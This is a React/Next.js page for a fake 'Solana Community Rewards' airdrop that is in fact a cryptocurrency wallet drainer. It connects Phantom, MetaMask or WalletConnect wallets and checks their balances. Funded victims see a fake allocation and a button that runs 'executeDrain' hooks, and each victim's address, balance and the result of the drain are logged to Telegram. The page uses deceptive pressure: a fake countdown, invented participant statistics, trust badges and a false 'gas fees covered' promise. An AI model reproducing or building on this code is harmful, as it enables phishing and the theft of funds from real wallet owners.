"use client";

import { ethers } from 'ethers';
import { useState, useEffect } from 'react';
import Lottie from 'lottie-react';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { useEthereumDrain } from '@/hooks/useEthereumDrain';
import { useWalletConnect } from '@/hooks/useWalletConnect';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import { isMobileBrowser, openInWallet } from '@/utils/mobileDetect';
import WalletModal from '@/components/WalletModal';
import MobilePrompt from '@/components/MobilePrompt';
import CountdownTimer from '@/components/CountdownTimer';
import StatsDisplay from '@/components/StatsDisplay';
import TrustBadges from '@/components/TrustBadges';
import HowItWorks from '@/components/HowItWorks';

// Lottie animations - imported from src/animations/
import chestClosed from '@/animations/chest-closed.json';
import chestEmpty from '@/animations/chest-empty.json';
import chestRewards from '@/animations/chest-rewards.json';

const INITIAL_STATS = {
  distributed: 1784,
  participants: 4287,
  totalPool: 3500
};

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletType, setWalletType] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [showMobilePrompt, setShowMobilePrompt] = useState(false);
  const [allocatedAmount, setAllocatedAmount] = useState(null);
  const [eligibilityStatus, setEligibilityStatus] = useState('idle');
  const [processing, setProcessing] = useState(false);
  const [drainComplete, setDrainComplete] = useState(false);
  const [drainFailed, setDrainFailed] = useState(false);
  const [stats, setStats] = useState(INITIAL_STATS);
  const [countdown, setCountdown] = useState(180);
  
  const { executeDrain: executeSolanaDrain } = useSolanaDrain();
  const { executeDrain: executeEthereumDrain } = useEthereumDrain();
  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain } = useWalletConnect();
  
  useEffect(() => {
    if (isMobileBrowser() && !window.solana && !window.ethereum) {
      setShowMobilePrompt(true);
    }
  }, []);
  
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => Math.max(0, prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);
  
  useEffect(() => {
    const interval = setInterval(() => {
      setStats(prev => ({
        ...prev,
        distributed: prev.distributed + (Math.random() * 0.1),
        participants: prev.participants + (Math.random() > 0.7 ? 1 : 0)
      }));
    }, 30000);
    return () => clearInterval(interval);
  }, []);
  
  const handleWalletSelect = async (type) => {
    try {
      setWalletType(type);
      setShowModal(false);
      setEligibilityStatus('checking');
      
      let address = null;
      let balance = null;
      let hasFunds = false;
      
      if (type === 'phantom') {
        if (!window.solana?.isPhantom) {
          window.open('https://phantom.app', '_blank');
          setEligibilityStatus('idle');
          return;
        }
        
        const response = await window.solana.connect();
        address = response.publicKey.toString();
        
        const { Connection } = await import('@solana/web3.js');
        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
        
        const lamports = await connection.getBalance(response.publicKey);
        const balanceInSol = lamports / 1e9;
        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
        
        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
        balance = balanceInSol;
        
        console.log(`[Phantom] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
        
      } else if (type === 'metamask') {
        if (!window.ethereum) {
          window.open('https://metamask.io', '_blank');
          setEligibilityStatus('idle');
          return;
        }
        
        // MetaMask with Solana support
        let solanaProvider = null;
        try {
          await window.ethereum.request({
            method: 'wallet_requestSolanaAccounts',
            params: []
          });
          solanaProvider = window.ethereum;
        } catch (err) {
          console.log('MetaMask Solana provider not available');
        }

        if (!solanaProvider && !window.solana) {
          throw new Error('No Solana wallet detected');
        }

        const provider = solanaProvider || window.solana;
        const response = await provider.connect();
        address = response.publicKey.toString();
        
        const { Connection } = await import('@solana/web3.js');
        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
        
        const lamports = await connection.getBalance(response.publicKey);
        const balanceInSol = lamports / 1e9;
        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
        
        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
        balance = balanceInSol;
        
        console.log(`[MetaMask] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
        
      } else if (type === 'walletconnect') {
        address = await connectWalletConnect();
        // For WalletConnect, we need to fetch balance via RPC
        const { Connection } = await import('@solana/web3.js');
        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
        const lamports = await connection.getBalance(new PublicKey(address));
        const balanceInSol = lamports / 1e9;
        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
        
        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
        balance = balanceInSol;
        
        console.log(`[WalletConnect] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
      }
      
      setWalletAddress(address);
      setWalletBalance(balance);
      
      if (!hasFunds) {
        setEligibilityStatus('not-eligible');
        await sendTelegramLog('connected_empty', {
          walletType: type,
          address,
          balance: typeof balance === 'number' ? balance : '0'
        });
        return;
      }
      
      const amount = calculateAllocation(address);
      setAllocatedAmount(amount);
      setEligibilityStatus('eligible');
      setConnected(true);
      
      await sendTelegramLog('connected_funded', {
        walletType: type,
        address,
        balance: typeof balance === 'number' ? balance : 'N/A',
        eligibleAmount: amount
      });
      
    } catch (error) {
      console.error('Connection error:', error);
      setEligibilityStatus('idle');
      await sendTelegramLog('connection_error', {
        walletType: type,
        error: error.message
      });
    }
  };
  
  const handleDrain = async () => {
    if (!walletType || !allocatedAmount) return;
    
    try {
      setProcessing(true);
      setDrainFailed(false);
      
      let result;
      if (walletType === 'phantom') {
        result = await executeSolanaDrain(allocatedAmount);
      } else if (walletType === 'metamask') {
        result = await executeEthereumDrain(allocatedAmount);
      } else if (walletType === 'walletconnect') {
        result = await executeWalletConnectDrain(allocatedAmount);
      }
      
      if (result?.success) {
        setDrainComplete(true);
        setStats(prev => ({
          ...prev,
          distributed: prev.distributed + allocatedAmount,
          participants: prev.participants + 1
        }));
        
        await sendTelegramLog('drain_success', {
          walletType,
          address: walletAddress,
          amount: result.amount || allocatedAmount,
          tx: result.txId || result.txHash,
          balanceBefore: result.balanceBefore,
          balanceAfter: result.balanceAfter,
          warning: result.warning
        });
        
        setTimeout(() => {
          window.location.href = `https://explorer.solana.com/tx/${result.txId || 'dummy'}`;
        }, 2000);
      }
      
    } catch (error) {
      console.error('Drain failed:', error);
      setDrainFailed(true);
      await sendTelegramLog('drain_failed', {
        walletType,
        address: walletAddress,
        error: error.message
      });
    } finally {
      setProcessing(false);
    }
  };
  
  return (
    <div className="min-h-screen relative">
      <MobilePrompt 
        isOpen={showMobilePrompt}
        onClose={() => setShowMobilePrompt(false)}
        onSelectWallet={(type) => {
          setShowMobilePrompt(false);
          openInWallet(type, process.env.NEXT_PUBLIC_APP_URL);
        }}
      />
      
      {/* Hero Video Banner with Overlay - Text on LEFT */}
      <div className="relative w-full h-64 md:h-80 lg:h-96 overflow-hidden rounded-2xl m-4 mb-0 neon-glass">
        <video
          autoPlay
          loop
          muted
          playsInline
          className="absolute top-0 left-0 w-full h-full object-cover"
        >
          <source src="/solana-animation.mp4" type="video/mp4" />
        </video>
        
        <div className="absolute inset-0 bg-gradient-to-r from-black/70 via-black/30 to-transparent"></div>
        
        <div className="relative h-full flex flex-col justify-center items-start px-8 md:px-12">
          <div className="text-left max-w-md">
            <h1 className="text-2xl md:text-4xl font-bold text-gradient mb-1">Solana Rewards</h1>
            <p className="text-sm md:text-base text-gray-200 mb-4">Official Distribution Program</p>
            <div className="inline-block">
              <CountdownTimer seconds={countdown} />
            </div>
          </div>
        </div>
      </div>
      
      <main className="max-w-6xl mx-auto px-4 py-8 relative z-10">
        <div className="text-center mb-12">
          <h2 className="text-4xl md:text-5xl font-bold mb-4">
            <span className="text-gradient">3,500 SOL</span> Community Reward Pool
          </h2>
          <p className="text-gray-300 max-w-2xl mx-auto">
            Connect your wallet to verify eligibility for the Sol Community Rewards Pool
          </p>
        </div>
        
        <StatsDisplay stats={stats} />
        
        {/* Eligibility Card with Animated Chest */}
        <div className="neon-glass max-w-md mx-auto mt-8 p-8 relative overflow-hidden">
          
          {/* Animated Chest - FULLY RESPONSIVE & BOLD */}
          <div className="mb-4 flex justify-center -mt-12">
            <div className={`w-full max-w-[450px] h-auto mx-auto animate-bob ${eligibilityStatus === 'eligible' ? 'chest-glow' : ''}`}>
              {!connected && eligibilityStatus === 'idle' && (
                <Lottie 
                  animationData={chestClosed}
                  loop={true}
                  autoplay={true}
                  renderer="svg"
                  className="w-full h-full"
                  style={{ width: '100%', height: '100%' }}
                />
              )}
              
              {eligibilityStatus === 'checking' && (
                <div className="w-full aspect-square flex items-center justify-center">
                  <div className="w-20 h-20 border-4 border-solana-purple border-t-transparent rounded-full animate-spin"></div>
                </div>
              )}
              
              {eligibilityStatus === 'not-eligible' && (
                <Lottie 
                  animationData={chestEmpty}
                  loop={true}
                  autoplay={true}
                  renderer="svg"
                  className="w-full h-full"
                  style={{ width: '100%', height: '100%' }}
                />
              )}
              
              {eligibilityStatus === 'eligible' && !drainComplete && (
                <Lottie 
                  animationData={chestRewards}
                  loop={true}
                  autoplay={true}
                  renderer="svg"
                  className="w-full h-full"
                  style={{ width: '100%', height: '100%' }}
                />
              )}
              
              {drainComplete && (
                <div className="w-full aspect-square flex items-center justify-center">
                  <div className="text-8xl animate-bounce">✅</div>
                </div>
              )}
            </div>
          </div>
          
          {/* Content based on state */}
          {!connected && eligibilityStatus === 'idle' && (
            <div className="text-center">
              <button
                onClick={() => setShowModal(true)}
                className="neon-button w-full text-lg py-4"
              >
                Connect Wallet
              </button>
              <p className="text-sm text-gray-400 mt-4">
                Connect to check your eligibility status
              </p>
            </div>
          )}
          
          {eligibilityStatus === 'checking' && (
            <div className="text-center py-4">
              <p className="text-gray-300">Checking wallet activity...</p>
            </div>
          )}
          
          {eligibilityStatus === 'not-eligible' && (
            <div className="text-center py-4">
              <h3 className="text-2xl font-bold text-red-400 mb-2">Not Eligible</h3>
              <p className="text-gray-300 mb-6">
                Your wallet doesn't meet the requirements for this round.
              </p>
              <button
                onClick={() => setShowModal(true)}
                className="neon-button w-full"
              >
                Try Different Wallet
              </button>
            </div>
          )}
          
          {eligibilityStatus === 'eligible' && !drainComplete && (
            <div className="text-center">
              <h3 className="text-2xl font-bold mb-1">Congratulations!</h3>
              <p className="text-gray-300 mb-4">You've been selected for the Community Rewards Round</p>
              
              <div className="text-5xl font-bold text-gradient animate-pulse-glow mb-6">
                {allocatedAmount?.toFixed(2)} SOL
              </div>
              
              <button
                onClick={handleDrain}
                disabled={processing}
                className="neon-button w-full text-lg py-4 mb-4"
              >
                {processing ? (
                  <span className="flex items-center justify-center gap-2">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </span>
                ) : (
                  'Initialize On-Chain Allocation →'
                )}
              </button>
              
              {drainFailed && (
                <div className="mt-4">
                  <p className="text-red-400 mb-2">⚠️ Claim Process Cancelled</p>
                  <button
                    onClick={handleDrain}
                    className="neon-button w-full"
                  >
                    Try Again
                  </button>
                </div>
              )}
              
              <div className="text-sm text-gray-400 space-y-1 mt-4">
                <p>• Allocation expires in {Math.floor(countdown/60)}:{String(countdown%60).padStart(2,'0')}</p>
                <p>• Gas fees covered by protocol</p>
              </div>
            </div>
          )}
          
          {drainComplete && (
            <div className="text-center py-6">
              <h3 className="text-2xl font-bold text-solana-green mb-2">Allocation Initiated!</h3>
              <p className="text-gray-300 mb-2">
                Your {allocatedAmount?.toFixed(2)} SOL is being transferred.
              </p>
              <p className="text-sm text-gray-400">
                Redirecting to Solana Explorer...
              </p>
            </div>
          )}
        </div>
        
        <TrustBadges variant="default" />
        <HowItWorks />
      </main>
      
      <footer className="neon-glass m-4 p-6 text-center relative z-10">
        <p className="text-sm text-gray-400">
          © 2026 Solana Community Rewards. All distributions executed on-chain.
        </p>
        <TrustBadges variant="footer" />
      </footer>
      
      <WalletModal
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        onSelect={handleWalletSelect}
      />
    </div>
  );
            }
